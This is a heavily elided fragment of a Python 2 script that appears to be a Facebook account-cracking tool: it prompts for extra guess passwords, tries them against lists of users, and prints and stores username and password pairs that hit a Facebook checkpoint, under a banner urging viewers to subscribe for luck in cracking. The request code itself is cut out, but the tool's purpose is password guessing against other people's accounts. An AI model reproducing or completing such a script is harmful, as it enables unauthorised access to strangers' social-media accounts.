...
def tokenz():
	...
	try:
		...
		os.system('clear')
		print logo
		jalan ('\033[0;97mSUBSCRIBE CHANEL SAYA DULU BRO BIAR HOKI CRACKNYA')
...
def pilih_bangla():
	...
	if teak =="":
		...
		pilih_bangla()
	jalan ("      \n     \033[0;97m  ┌════════════════════════════════════════┐") 
	jalan ("      \033[0;93m █        \033[0;97mCreate Additional Password ?   \033[0;93m █") 
	jalan ("      \033[0;97m └════════════════════════════════════════┘       ") 
	pass4 = raw_input("\n \033[0;97m      [•\033[0;93m•\033[0;97m] Password 1 : \033[0;93m ")
	pass5 = raw_input(" \033[0;97m      [•\033[0;93m•\033[0;97m] Password 2 : \033[0;93m ")
							...
							if 'access_token' in w:
								...
								if 'www.facebook.com' in w['error_msg']:
									...
									if 'access_token' in w:
										...
										if 'www.facebook.com' in w['error_msg']:
											print '          \033[0;97m[\033[0;93mCP\033[0;97m] ' + user + ' | ' + pass4
											cekpoint.append(user)
										else:
											...
											if 'access_token' in w:
												...
												if 'www.facebook.com' in w['error_msg']:
													print '          \033[0;97m[\033[0;93mCP\033[0;97m] ' + user + ' | ' + pass5
													cekpoint.append(user)
